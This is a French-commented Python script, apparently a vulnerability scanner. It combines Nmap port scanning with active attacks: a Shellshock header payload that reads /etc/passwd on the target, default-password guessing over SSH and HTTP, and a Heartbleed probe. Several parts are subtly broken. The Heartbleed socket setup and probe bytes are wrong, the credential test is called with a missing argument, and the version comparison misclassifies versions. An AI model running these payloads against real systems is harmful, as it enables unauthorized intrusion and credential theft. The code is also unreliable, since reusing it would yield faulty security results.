#!/usr/bin/env python3
"""
Script d'analyse de vulnérabilités et de tests de sécurité.
Fonctionnalités :
- Scan de ports (TCP/UDP).
- Détection de services vulnérables.
- Tests de vulnérabilités connues (Heartbleed, Shellshock).
- Génération de rapports (HTML/JSON).
"""

import socket
import ssl
import subprocess
import json
import argparse
from datetime import datetime
import requests
import nmap

# Liste des vulnérabilités connues à tester
KNOWN_VULNERABILITIES = {
    "Heartbleed": {
        "ports": [443],
        "test": "test_heartbleed",
        "description": "Vulnérabilité Heartbleed (CVE-2014-0160) dans OpenSSL."
    },
    "Shellshock": {
        "ports": [80, 443, 8080],
        "test": "test_shellshock",
        "description": "Vulnérabilité Shellshock (CVE-2014-6271) dans Bash."
    },
    "Default_Credentials": {
        "ports": [22, 80, 443, 8080],
        "test": "test_default_credentials",
        "description": "Identifiants par défaut (ex: admin:admin)."
    }
}

# Services et ports courants avec leurs vulnérabilités connues
VULNERABLE_SERVICES = {
    "OpenSSH": {
        "versions": ["<7.6"],
        "cve": ["CVE-2018-15473"]
    },
    "Apache": {
        "versions": ["<2.4.38"],
        "cve": ["CVE-2019-0211"]
    },
    "Nginx": {
        "versions": ["<1.15.6"],
        "cve": ["CVE-2018-16843"]
    }
}

# Identifiants par défaut à tester
DEFAULT_CREDENTIALS = {
    "admin": ["admin", "password", "1234"],
    "root": ["toor", "root", "1234"],
    "user": ["user", "password"]
}

def scan_ports(target, ports="1-1000", scan_type="-sV"):
    """
    Effectue un scan de ports avec Nmap.
    Retourne les ports ouverts et les services détectés.
    """
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=target, ports=ports, arguments=scan_type)
        return nm[target]
    except Exception as e:
        print(f"[!] Erreur lors du scan Nmap : {e}")
        return {}

def test_heartbleed(target, port=443):
    """
    Teste la vulnérabilité Heartbleed sur un service SSL.
    """
    try:
        conn = ssl.SSLSocket(socket.socket())
        conn.settimeout(5)
        conn.connect((target, port))
        conn.send(b"\x18\x03\x01\x00\x03\x01\x40\x00")  # Heartbeat request
        response = conn.recv(1024)
        conn.close()
        if len(response) > 3:
            return True, "Vulnérable à Heartbleed !"
    except Exception:
        pass
    return False, "Non vulnérable ou service non accessible."

def test_shellshock(target, port=80):
    """
    Teste la vulnérabilité Shellshock via une requête HTTP.
    """
    url = f"http://{target}:{port}/cgi-bin/test.cgi"
    headers = {
        "User-Agent": "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
    }
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if "root:" in response.text:
            return True, "Vulnérable à Shellshock !"
    except Exception:
        pass
    return False, "Non vulnérable ou service non accessible."

def test_default_credentials(target, port, service):
    """
    Teste les identifiants par défaut sur un service.
    """
    if service not in ["ssh", "http", "https", "telnet"]:
        return False, "Service non supporté pour ce test."

    for user, passwords in DEFAULT_CREDENTIALS.items():
        for password in passwords:
            try:
                if service == "ssh":
                    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{target} -p {port} 'echo success'"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if "success" in result.stdout:
                        return True, f"Identifiants par défaut valides : {user}/{password}"
                elif service in ["http", "https"]:
                    url = f"http{'s' if service == 'https' else ''}://{target}:{port}"
                    response = requests.get(url, auth=(user, password), timeout=5)
                    if response.status_code == 200:
                        return True, f"Identifiants par défaut valides : {user}/{password}"
            except Exception:
                continue
    return False, "Aucun identifiant par défaut valide trouvé."

def check_service_version(service, version):
    """
    Vérifie si une version de service est vulnérable.
    """
    for svc, data in VULNERABLE_SERVICES.items():
        if svc.lower() in service.lower():
            for vulnerable_version in data["versions"]:
                if version.startswith(vulnerable_version.replace("<", "")):
                    return True, f"Version vulnérable : {version} (CVE: {', '.join(data['cve'])})"
    return False, "Version non vulnérable ou inconnue."

def generate_report(results, format="json"):
    """
    Génère un rapport au format JSON ou HTML.
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report = {
        "timestamp": timestamp,
        "target": results.get("target", "inconnu"),
        "vulnerabilities": results.get("vulnerabilities", []),
        "open_ports": results.get("open_ports", [])
    }

    if format == "json":
        with open(f"report_{report['target']}.json", "w") as f:
            json.dump(report, f, indent=4)
        print(f"[+] Rapport JSON généré : report_{report['target']}.json")
    elif format == "html":
        html = f"""
        <h1>Rapport de sécurité pour {report['target']}</h1>
        <h2>Date : {timestamp}</h2>
        <h3>Ports ouverts :</h3>
        <ul>{''.join(f'<li>{port}: {service}</li>' for port, service in report['open_ports'])}</ul>
        <h3>Vulnérabilités détectées :</h3>
        <ul>{''.join(f'<li><strong>{vuln['name']}</strong> : {vuln['description']} ({vuln['status']})</li>' for vuln in report['vulnerabilities'])}</ul>
        """
        with open(f"report_{report['target']}.html", "w") as f:
            f.write(html)
        print(f"[+] Rapport HTML généré : report_{report['target']}.html")

def main():
    parser = argparse.ArgumentParser(description="Analyseur de vulnérabilités et tests de sécurité.")
    parser.add_argument("target", help="Adresse IP ou nom de domaine de la cible.")
    parser.add_argument("--ports", default="1-1000", help="Plage de ports à scanner (ex: 1-1000 ou 22,80,443).")
    parser.add_argument("--report", choices=["json", "html"], default="json", help="Format du rapport (JSON ou HTML).")
    args = parser.parse_args()

    print(f"[*] Début de l'analyse pour {args.target}...")
    results = {"target": args.target, "vulnerabilities": [], "open_ports": []}

    # Scan de ports
    nmap_results = scan_ports(args.target, args.ports)
    for proto in nmap_results.all_protocols():
        for port in nmap_results[proto].keys():
            service = nmap_results[proto][port]["name"]
            version = nmap_results[proto][port]["version"]
            results["open_ports"].append((port, f"{service} {version}"))

            # Vérification des vulnérabilités connues
            is_vulnerable, description = check_service_version(service, version)
            if is_vulnerable:
                results["vulnerabilities"].append({
                    "name": f"Version vulnérable de {service}",
                    "description": description,
                    "status": "VULNÉRABLE"
                })

            # Tests spécifiques
            for vuln_name, vuln_data in KNOWN_VULNERABILITIES.items():
                if port in vuln_data["ports"]:
                    test_func = globals()[vuln_data["test"]]
                    is_vuln, status = test_func(args.target, port)
                    if is_vuln:
                        results["vulnerabilities"].append({
                            "name": vuln_name,
                            "description": vuln_data["description"],
                            "status": status
                        })

    # Génération du rapport
    generate_report(results, args.report)
    print("[+] Analyse terminée.")

if __name__ == "__main__":
    main()
